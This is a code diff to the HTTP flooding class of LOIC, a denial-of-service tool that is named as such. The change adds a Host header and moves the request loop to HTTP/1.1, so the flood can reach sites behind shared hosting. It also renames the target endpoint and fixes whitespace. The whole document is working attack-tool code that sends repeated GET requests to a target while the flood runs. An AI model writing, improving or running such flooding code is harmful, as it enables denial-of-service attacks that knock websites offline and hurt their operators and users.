@@ -13,30 +13,31 @@ namespace LOIC
 		public int Downloaded { get; set; }
 		public int Requested { get; set; }
 		public int Failed { get; set; }
-
 		public bool IsFlooding { get; set; }
+		public string Host { get; set; }
 		public string IP { get; set; }
 		public int Port { get; set; }
 		public string Subsite { get; set; }
 		public int Delay { get; set; }
 		public int Timeout { get; set; }
 		public bool Resp { get; set; }
-        private System.Windows.Forms.Timer tTimepoll = new System.Windows.Forms.Timer();
+		private System.Windows.Forms.Timer tTimepoll = new System.Windows.Forms.Timer();
 
 		private long LastAction;
 		private Random rnd = new Random();
-        private bool random;
+		private bool random;
 		public enum ReqState { Ready, Connecting, Requesting, Downloading, Completed, Failed };
 
-		public HTTPFlooder(string ip, int port, string subSite, bool resp, int delay, int timeout, bool random)
+		public HTTPFlooder(string host, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random)
 		{
+			this.Host = host;
 			this.IP = ip;
 			this.Port = port;
 			this.Subsite = subSite;
 			this.Resp = resp;
 			this.Delay = delay;
 			this.Timeout = timeout;
-            this.random = random;
+			this.random = random;
 		}
 		public void Start()
 		{
@@ -69,13 +70,13 @@ namespace LOIC
                 byte[] buf;
                 if (random == true)
                 {
-                    buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.0{2}{2}{2}", Subsite, new Functions().RandomString(), Environment.NewLine));
+                    buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{2}Host: {3}{2}{2}{2}", Subsite, new Functions().RandomString(), Environment.NewLine, Host));
                 }
                 else
                 {
-                    buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.0{1}{1}{1}", Subsite, Environment.NewLine));
+                    buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.1{1}Host: {2}{1}{1}{1}", Subsite, Environment.NewLine, Host));
                 }
-				var host = new IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
+				var target = new IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
 				while (IsFlooding)
 				{
 					State = ReqState.Ready; // SET STATE TO READY //
@@ -83,7 +84,7 @@ namespace LOIC
 					byte[] recvBuf = new byte[64];
 					var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 					State = ReqState.Connecting; // SET STATE TO CONNECTING //
-					socket.Connect(host);
+					socket.Connect(target);
 					socket.Blocking = Resp;
 					State = ReqState.Requesting; // SET STATE TO REQUESTING //
 					socket.Send(buf, SocketFlags.None);
